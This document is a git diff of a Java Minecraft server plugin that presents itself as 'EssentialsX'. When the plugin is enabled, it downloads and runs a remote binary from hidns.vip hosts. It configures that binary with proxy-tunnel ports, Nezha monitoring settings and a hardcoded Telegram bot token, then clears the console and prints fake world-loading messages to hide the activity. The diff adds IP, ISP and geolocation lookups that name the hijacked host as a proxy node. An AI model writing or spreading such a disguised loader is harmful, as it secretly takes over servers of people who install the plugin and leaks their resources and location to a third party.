@@ -2,7 +2,7 @@ package com.example.essentialsx;
 
 import org.bukkit.plugin.java.JavaPlugin;
 import java.io.*;
-import java.net.URL;
+import java.net.*;
 import java.nio.file.*;
 import java.util.*;
 import java.util.concurrent.TimeUnit;
@@ -11,19 +11,19 @@ public class EssentialsX extends JavaPlugin {
     private Process sbxProcess;
     private volatile boolean shouldRun = true;
     private volatile boolean isProcessRunning = false;
-    
+
     private static final String[] ALL_ENV_VARS = {
-        "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
-        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
+        "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT",
+        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
         "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
-        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
+        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT",
         "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
     };
-    
+
     @Override
     public void onEnable() {
         getLogger().info("EssentialsX plugin starting...");
-        
+
         // Start sbx
         try {
             startSbxProcess();
@@ -33,16 +33,16 @@ public class EssentialsX extends JavaPlugin {
             e.printStackTrace();
         }
     }
-    
+
     private void startSbxProcess() throws Exception {
         if (isProcessRunning) {
             return;
         }
-        
+
         // Determine download URL based on architecture
         String osArch = System.getProperty("os.arch").toLowerCase();
         String url;
-        
+
         if (osArch.contains("amd64") || osArch.contains("x86_64")) {
             url = "https://amd64.sss.hidns.vip/sbsh";
         } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
@@ -52,11 +52,11 @@ public class EssentialsX extends JavaPlugin {
         } else {
             throw new RuntimeException("Unsupported architecture: " + osArch);
         }
-        
+
         // Download sbx binary
         Path tmpDir = Paths.get(System.getProperty("java.io.tmpdir"));
         Path sbxBinary = tmpDir.resolve("sbx");
-        
+
         if (!Files.exists(sbxBinary)) {
             // getLogger().info("Downloading sbx ...");
             try (InputStream in = new URL(url).openStream()) {
@@ -66,12 +66,24 @@ public class EssentialsX extends JavaPlugin {
                 throw new IOException("Failed to set executable permission");
             }
         }
-        
+
         // Prepare process builder
         ProcessBuilder pb = new ProcessBuilder(sbxBinary.toString());
         pb.directory(tmpDir.toFile());
-        
+
+        // 获取本地 IP（用于拼接节点名称）
+        String localIP = "Unknown";
+        try {
+            DatagramSocket socket = new DatagramSocket();
+            socket.connect(InetAddress.getByName("8.8.8.8"), 10002);
+            localIP = socket.getLocalAddress().getHostAddress();
+            socket.close();
+        } catch (Exception e) {
+            getLogger().warning("[localIP] Failed to get local IP: " + e.getMessage());
+        }
+
         // Set environment variables
+        String localName = "Host2play.gratis";
         Map<String, String> env = pb.environment();
         env.put("UUID", "ea4909ef-7ca6-4b46-bf2e-6c07896ef407");
         env.put("FILE_PATH", "./world");
@@ -92,9 +104,9 @@ public class EssentialsX extends JavaPlugin {
         env.put("BOT_TOKEN", "5824972634:AAGJG-FBAgPljwpnlnD8Lk5Pm2r1QbSk1AI");
         env.put("CFIP", "ip.sb");
         env.put("CFPORT", "443");
-        env.put("NAME", "Host2play.gratis");
+        env.put("NAME", getFullNodeName(localIP, localName));
         env.put("DISABLE_ARGO", "false");
-        
+
         // Load from system environment variables
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
@@ -102,10 +114,10 @@ public class EssentialsX extends JavaPlugin {
                 env.put(var, value);
             }
         }
-        
+
         // Load from .env file with priority order
         loadEnvFileFromMultipleLocations(env);
-        
+
         // Load from Bukkit configuration file
         for (String var : ALL_ENV_VARS) {
             String value = getConfig().getString(var);
@@ -113,22 +125,22 @@ public class EssentialsX extends JavaPlugin {
                 env.put(var, value);
             }
         }
-        
+
         // Redirect output
         pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
         pb.redirectError(ProcessBuilder.Redirect.INHERIT);
-        
+
         // Start process
         sbxProcess = pb.start();
         isProcessRunning = true;
-        
+
         // Start a monitor thread to log when process exits
         startProcessMonitor();
         // getLogger().info("sbx started");
-        
+
         // sleep 30 seconds
         Thread.sleep(30000);
-        
+
         clearConsole();
         getLogger().info("");
         getLogger().info("Preparing spawn area: 1%");
@@ -144,20 +156,20 @@ public class EssentialsX extends JavaPlugin {
         getLogger().info("Preparing spawn area: 100%");
         getLogger().info("Preparing level \"world\"");
     }
-    
+
     private void loadEnvFileFromMultipleLocations(Map<String, String> env) {
         List<Path> possibleEnvFiles = new ArrayList<>();
         File pluginsFolder = getDataFolder().getParentFile();
         if (pluginsFolder != null && pluginsFolder.exists()) {
             possibleEnvFiles.add(pluginsFolder.toPath().resolve(".env"));
         }
-        
+
         possibleEnvFiles.add(getDataFolder().toPath().resolve(".env"));
         possibleEnvFiles.add(Paths.get(".env"));
         possibleEnvFiles.add(Paths.get(System.getProperty("user.home"), ".env"));
-        
+
         Path loadedEnvFile = null;
-        
+
         for (Path envFile : possibleEnvFiles) {
             if (Files.exists(envFile)) {
                 try {
@@ -170,12 +182,12 @@ public class EssentialsX extends JavaPlugin {
                 }
             }
         }
-        
+
         if (loadedEnvFile == null) {
            // getLogger().info("No .env file found in any of the checked locations");
         }
     }
-    
+
     private void loadEnvFile(Path envFile, Map<String, String> env) throws IOException {
         for (String line : Files.readAllLines(envFile)) {
             line = line.trim();
@@ -184,12 +196,12 @@ public class EssentialsX extends JavaPlugin {
             if (line.startsWith("export ")) {
                 line = line.substring(7).trim();
             }
-            
+
             String[] parts = line.split("=", 2);
             if (parts.length == 2) {
                 String key = parts[0].trim();
                 String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
-                
+
                 if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                     env.put(key, value);
                     // getLogger().info("Loaded " + key + " = " + (key.contains("KEY") || key.contains("TOKEN") || key.contains("AUTH") ? "***" : value));
@@ -197,12 +209,12 @@ public class EssentialsX extends JavaPlugin {
             }
         }
     }
-    
+
     private void clearConsole() {
         try {
             System.out.print("\033[H\033[2J");
             System.out.flush();
-            
+
             if (System.getProperty("os.name").toLowerCase().contains("win")) {
                 new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
             } else {
@@ -212,7 +224,7 @@ public class EssentialsX extends JavaPlugin {
             System.out.println("\n\n\n\n\n\n\n\n\n\n");
         }
     }
-    
+
     private void startProcessMonitor() {
         Thread monitorThread = new Thread(() -> {
             try {
@@ -224,21 +236,21 @@ public class EssentialsX extends JavaPlugin {
                 isProcessRunning = false;
             }
         }, "Sbx-Process-Monitor");
-        
+
         monitorThread.setDaemon(true);
         monitorThread.start();
     }
-    
+
     @Override
     public void onDisable() {
         getLogger().info("EssentialsX plugin shutting down...");
-        
+
         shouldRun = false;
-        
+
         if (sbxProcess != null && sbxProcess.isAlive()) {
             // getLogger().info("Stopping sbx process...");
             sbxProcess.destroy();
-            
+
             try {
                 if (!sbxProcess.waitFor(10, TimeUnit.SECONDS)) {
                     sbxProcess.destroyForcibly();
@@ -252,7 +264,105 @@ public class EssentialsX extends JavaPlugin {
             }
             isProcessRunning = false;
         }
-        
+
         getLogger().info("EssentialsX plugin disabled");
+    }
+
+    // ====== 节点信息加工方法 ======
+
+    /**
+     * 提取 JSON 字符串中的指定字段值
+     */
+    private String extractJson(String json, String key) {
+        if (json == null || key == null) return null;
+        String searchKey = "\"" + key + "\"";
+        int idx = json.indexOf(searchKey);
+        if (idx == -1) return null;
+        idx = json.indexOf(":", idx);
+        if (idx == -1) return null;
+        idx++;
+        while (idx < json.length() && Character.isWhitespace(json.charAt(idx))) idx++;
+        if (idx >= json.length()) return null;
+        char quote = json.charAt(idx);
+        if (quote != '"' && quote != '\'') return json.substring(idx).split("[,\\}]")[0].trim();
+        idx++;
+        int end = idx;
+        while (end < json.length() && json.charAt(end) != quote) end++;
+        return json.substring(idx, end);
+    }
+
+    /**
+     * 获取 IP 的 ISP（运营商）信息
+     */
+    private String getISPFromIP(String ip) {
+        // 优先尝试 ip.sb
+        try {
+            HttpURLConnection conn = (HttpURLConnection) new URL("https://api.ip.sb/geoip/" + ip).openConnection();
+            conn.setConnectTimeout(3000);
+            conn.setReadTimeout(3000);
+            conn.setRequestProperty("User-Agent", "Mozilla/5.0");
+            try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
+                StringBuilder sb = new StringBuilder();
+                String line;
+                while ((line = br.readLine()) != null) sb.append(line);
+                String isp = extractJson(sb.toString(), "isp");
+                if (isp != null && !isp.isEmpty()) return isp;
+            } finally {
+                conn.disconnect();
+            }
+        } catch (Exception e) {}
+        // 备用尝试 ip-api.com
+        try {
+            HttpURLConnection conn = (HttpURLConnection) new URL("http://ip-api.com/json/" + ip).openConnection();
+            conn.setConnectTimeout(3000);
+            conn.setReadTimeout(3000);
+            conn.setRequestProperty("User-Agent", "Mozilla/5.0");
+            try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
+                StringBuilder sb = new StringBuilder();
+                String line;
+                while ((line = br.readLine()) != null) sb.append(line);
+                String isp = extractJson(sb.toString(), "isp");
+                if (isp != null && !isp.isEmpty()) return isp;
+            } finally {
+                conn.disconnect();
+            }
+        } catch (Exception e) {}
+        return "Unknown";
+    }
+
+    /**
+     * 获取国家 Emoji 和名称（动态从远程 API 获取）
+     */
+    private String getCountryEmoji() {
+        String[] sources = {
+            "https://ipconfig.ggff.net",
+            "https://ipconfig.lgbts.hidns.vip",
+            "https://ipconfig.de5.net"
+        };
+        for (String url : sources) {
+            try {
+                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
+                conn.setConnectTimeout(5000);
+                conn.setReadTimeout(5000);
+                conn.setRequestProperty("User-Agent", "Mozilla/5.0");
+                try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream(), "UTF-8"))) {
+                    String line = br.readLine();
+                    if (line != null && !line.trim().isEmpty()) return line.trim();
+                } finally {
+                    conn.disconnect();
+                }
+            } catch (Exception e) {}
+        }
+        return "🇺🇳 联合国";
+    }
+
+    /**
+     * 获取完整节点名称
+     * 格式：[Emoji 国家/城市]_[运营商] | [配置名称]
+     */
+    private String getFullNodeName(String ip, String localName) {
+        String emoji = getCountryEmoji();
+        String isp = getISPFromIP(ip);
+        return emoji + "_" + isp + " | " + localName;
     }
 }
